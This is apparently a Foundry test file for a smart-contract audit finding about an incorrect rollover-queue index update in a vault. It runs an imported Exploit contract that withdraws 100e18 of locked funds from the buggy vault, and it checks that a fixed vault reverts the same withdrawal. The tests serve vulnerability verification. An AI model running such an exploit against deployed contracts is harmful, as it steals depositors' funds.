// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Asset,
    VaultFixed,
    Filler,
    Victim
} from "./18533-h-1-funds-can-be-stolen-because-of-incorrect-update-to-owner.sol";

contract Finding18533Test is Test {
    function test_buggy_index_withdraws_locked_100e18() public {
        Exploit e = new Exploit();
        assertEq(e.asset().balanceOf(address(e)), 0, "locked funds start in the vault");
        assertEq(e.vault().ownerToRollOverQueueIndex(address(e)), 1, "own slot before the update");
        assertEq(e.asset().balanceOf(address(e.vault())), 201e18, "vault holds attacker + filler + victim");

        e.run();

        assertEq(e.stolen(), 100e18, "withdrew the locked 100e18");
        assertEq(e.shortfall(), 100e18, "books are short exactly 100e18");
        assertEq(e.asset().balanceOf(address(e)), 100e18, "attacker holds the withdrawn assets");
        assertEq(e.vault().ownerToRollOverQueueIndex(address(e)), 2, "index now selects the filler");
        (uint256 assets,, uint256 epochId) = e.vault().rolloverQueue(0);
        assertEq(assets, 100e18, "queue slot 0 still books 100e18");
        assertEq(epochId, 1, "queue slot 0 still books epoch 1");
        assertEq(e.asset().balanceOf(address(e.vault())), 101e18, "vault lost the locked 100e18");
    }

    function test_control_fixed_index_keeps_100e18_locked() public {
        Asset token = new Asset();
        VaultFixed fixedVault = new VaultFixed(address(token));
        Filler filler = new Filler();
        Victim victim = new Victim();

        token.mint(address(this), 100e18);
        token.approve(address(fixedVault), 100e18);
        fixedVault.deposit(1, 100e18);
        fixedVault.enlistInRollover(1, 100e18);
        assertEq(fixedVault.ownerToRollOverQueueIndex(address(this)), 1, "new item is index 1");

        token.mint(address(filler), 1e18);
        filler.join(fixedVault, token, 2, 1e18);
        token.mint(address(victim), 100e18);
        victim.depositOnly(fixedVault, token, 1, 100e18);

        fixedVault.enlistInRollover(1, 100e18);
        assertEq(fixedVault.ownerToRollOverQueueIndex(address(this)), 1, "update keeps the original index");
        assertEq(fixedVault.queueLength(), 2, "filler is still the tail");

        bool pulled;
        try fixedVault.withdraw(1, 100e18) {
            pulled = true;
        } catch {
            pulled = false;
        }
        assertFalse(pulled, "control withdraw reverts AlreadyRollingOver");
        assertEq(token.balanceOf(address(this)), 0, "control pays out nothing");
        assertEq(token.balanceOf(address(fixedVault)), 201e18, "locked 100e18 stays in the vault");
    }
}
